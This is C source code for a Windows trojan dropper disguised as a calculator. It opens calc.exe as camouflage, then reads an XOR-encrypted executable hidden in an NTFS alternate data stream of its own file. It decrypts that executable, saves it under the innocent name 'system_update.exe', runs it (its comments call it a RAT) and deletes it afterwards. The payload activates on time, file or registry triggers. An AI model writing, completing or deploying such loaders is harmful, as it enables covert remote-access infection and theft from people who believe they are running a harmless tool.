#include <windows.h>
#include <stdio.h>

#define ADS_NAME ":s12data"

// Generate decryption key (same as before)
void GenerateKey(PBYTE key, DWORD keySize, const char* seed) {
    DWORD seedHash = 0x811C9DC5;
    
    for (int i = 0; seed[i]; i++) {
        seedHash ^= seed[i];
        seedHash *= 0x01000193;
    }
    
    DWORD entropy1 = GetTickCount();
    DWORD entropy2 = GetCurrentProcessId();
    DWORD entropy3 = (DWORD)GetCurrentThreadId();
    
    for (DWORD i = 0; i < keySize; i++) {
        key[i] = (BYTE)((seedHash >> (i % 4) * 8) ^ 
                       (entropy1 >> (i % 4) * 8) ^
                       (entropy2 >> (i % 4) * 8) ^
                       (entropy3 >> (i % 4) * 8) ^
                       (i * 37));
        
        seedHash = ((seedHash << 5) + seedHash) + i;
    }
}

// XOR decrypt using 16-byte pattern
void DecryptPayload(PBYTE data, DWORD size) {
    // Using the confirmed XOR pattern
    BYTE xorPattern[16] = {0x8C, 0x54, 0xE8, 0x74, 0xEB, 0x25, 0xA8, 0x54,
                           0x60, 0x84, 0x19, 0x5A, 0x56, 0x13, 0x02, 0x65};
    
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= xorPattern[i % 16];
    }
}

// Launch calculator (for camouflage)
void LaunchCalculator() {
    // Try modern calculator first
    ShellExecuteA(NULL, "open", "calc.exe", NULL, NULL, SW_SHOWNORMAL);
}

// Check activation conditions
BOOL ShouldActivatePayload() {
    // Example triggers (customize as needed):
    
    // 1. Time-based trigger (activate after 5 minutes)
    static DWORD startTime = 0;
    if (startTime == 0) startTime = GetTickCount();
    if (GetTickCount() - startTime > 300000) return TRUE; // 5 minutes
    
    // 2. File-based trigger
    if (GetFileAttributesA("C:\\trigger.txt") != INVALID_FILE_ATTRIBUTES) return TRUE;
    
    // 3. Registry-based trigger  
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Activate", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    
    // 4. Always activate (for testing)
    // return TRUE;
    
    return FALSE; // Default: don't activate
}

// Extract and execute payload from ADS
BOOL ExtractAndExecutePayload() {
    printf("Extracting hidden payload...\n");
    
    // Get current executable path
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    // Build ADS path
    char adsPath[MAX_PATH];
    snprintf(adsPath, sizeof(adsPath), "%s%s", exePath, ADS_NAME);
    
    // Open ADS
    HANDLE hADS = CreateFileA(adsPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hADS == INVALID_HANDLE_VALUE) {
        return FALSE; // No payload found
    }
    
    DWORD payloadSize = GetFileSize(hADS, NULL);
    PBYTE payload = (PBYTE)HeapAlloc(GetProcessHeap(), 0, payloadSize);
    
    DWORD bytesRead;
    ReadFile(hADS, payload, payloadSize, &bytesRead, NULL);
    CloseHandle(hADS);
    
    // Decrypt payload
    DecryptPayload(payload, payloadSize);
    
    // Verify PE header
    if (payload[0] != 0x4D || payload[1] != 0x5A) {
        HeapFree(GetProcessHeap(), 0, payload);
        return FALSE; // Decryption failed
    }
    
    printf("Payload decrypted successfully!\n");
    
    // METHOD 1: Save and execute (simpler but more detectable)
    char tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempFile);
    strcat(tempFile, "\\system_update.exe"); // Innocent name
    
    HANDLE hTemp = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                              FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTemp != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hTemp, payload, payloadSize, &written, NULL);
        CloseHandle(hTemp);
        
        // Execute the RAT
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        
        if (CreateProcessA(tempFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            printf("Payload activated successfully!\n");
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            
            // Clean up after delay
            Sleep(3000);
            DeleteFileA(tempFile);
        }
    }
    
    HeapFree(GetProcessHeap(), 0, payload);
    return TRUE;
}

// Main execution function
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Always launch calculator first (for camouflage)
    LaunchCalculator();
    
    // Check if we should activate the hidden payload
    if (ShouldActivatePayload()) {
        ExtractAndExecutePayload();
    }
    
    return 0;
}

// Console version for testing
int main() {
    printf("System Calculator v1.0\n");
    printf("======================\n");
    
    // Launch calculator
    LaunchCalculator();
    printf("Calculator launched.\n");
    
    // Check activation
    if (ShouldActivatePayload()) {
        printf("Activation conditions met!\n");
        if (ExtractAndExecutePayload()) {
            printf("Hidden functionality activated.\n");
        } else {
            printf("Activation failed.\n");
        }
    } else {
        printf("Remaining dormant.\n");
    }
    
    return 0;
}
